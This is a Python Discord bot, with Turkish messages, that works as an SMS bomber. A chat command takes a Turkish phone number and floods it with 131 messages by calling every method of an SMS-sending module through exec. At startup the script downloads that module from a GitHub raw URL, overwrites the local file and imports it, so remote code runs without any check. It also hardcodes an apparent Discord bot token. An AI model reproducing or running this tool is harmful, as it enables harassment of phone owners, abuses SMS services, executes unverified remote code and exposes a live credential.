import discord
from time import sleep
from requests import get
r = get("https://raw.githubusercontent.com/GokuMUI1/gokuprivate/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("güncelleme yapıyo.")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms

TOKEN = "MTA3OTE5MDkxODY2MzUwMzk0Mg.G5NPFN.cEGg2o7piPl_s8pylx4eIempZTc9n03xHm2_fk"
gif = "https://media.tenor.com/SWiGXYOM8eMAAAAC/russia-soviet.gif"
adet = 131
saniye = 0

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} calisiyor'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name="Goku#0005")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "*seks":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="mesaj sokucu (+90)", description=(f"{adet} adet msj yollanıyor --> {telno}\n{message.author.mention}"), color=0x001eff)
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet mesaj gönderildi.\n{message.author.mention}")                        
        else:
            await message.channel.send(f"gecerli komut yaz\nyardim icin' *help ' yaz veya dmden ulasabilirsin.\n{message.author.mention}")
    elif "*help" == message.content:
        await message.channel.send(f"mesaj gondermek icin komutu bu sekilde yaz\n```*seks 5051234567```\n*seks (telefon numarası)\n{message.author.mention}")
    else:
        pass
  
client.run(TOKEN)
